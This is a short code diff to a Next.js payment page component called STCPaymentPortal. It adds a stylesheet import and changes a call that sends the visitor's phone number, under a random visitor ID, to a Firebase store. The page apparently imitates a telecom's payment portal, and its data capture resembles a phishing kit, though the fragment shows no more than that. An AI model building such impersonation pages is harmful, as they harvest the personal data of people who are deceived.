@@ -7,6 +7,8 @@ import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { User, ShoppingCart, Search, Share2, Smartphone, Shield } from "lucide-react"
 import { useRouter } from "next/navigation"
+import "./globals.css"
+
 import { useCallback, useEffect, useState } from "react"
 const visitorId = `ssscg-app-${Math.random().toString(36).substring(2, 15)}`;
 export default function STCPaymentPortal() {
@@ -19,7 +21,7 @@ export default function STCPaymentPortal() {
   const handlePayNow = async () => {
     setIsLoading(true)
     setLoadingProgress(0)
-    addData({ id: visitorId, mobile: phone })
+    addData({ id: visitorId, mobile: phone,phone})
     const progressInterval = setInterval(() => {
       setLoadingProgress((prev) => {
         if (prev >= 100) {
